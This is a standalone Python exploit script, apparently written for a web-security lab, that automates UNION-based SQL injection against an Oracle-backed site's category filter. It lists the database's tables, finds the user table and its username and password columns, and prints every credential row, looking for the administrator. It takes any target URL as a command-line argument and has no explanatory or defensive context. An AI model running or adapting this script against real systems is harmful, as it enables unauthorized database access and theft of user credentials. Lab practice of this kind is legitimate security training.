import requests
import sys
import urllib3
import regex as re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080'}


def dump_data(url, uri, user_table, user_column, password_column):
    payload = f"' union select {user_column}, {password_column} from {user_table}--"
    r = requests.get(url+uri+payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    for i in soup.find_all('tr'):
        print(i.text)
        if "administrator" in i.text:
            return True


def find_columns(url, uri, user_table):
    payload = f"' union select column_name,null from all_tab_columns where table_name='{user_table}'--"
    r = requests.get(url+uri+payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    user_column = soup.find(string=re.compile('.*USERNAME.*'))
    password_column = soup.find(string=re.compile('.*PASSWORD.*'))

    print(f"[+] Found the columns: {user_column} and {password_column}\n")
    if (user_column and password_column):
        return dump_data(url, uri, user_table, user_column, password_column)


def exploit_payload(url):
    uri = "/filter?category=Pets"
    payload = "' union select table_name,null from all_tables--"
    r = requests.get(url+uri+payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    user_table = soup.find_all(string=re.compile(
        'USERS.*'))[1]
    print(f"[+] Found the user table: {user_table}\n")
    if user_table:
        return find_columns(url, uri, user_table)


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)
    if exploit_payload(url):
        print("[+] SQL Injection Successful!")
    else:
        print("[-] SQL Injection Unsuccessful!")
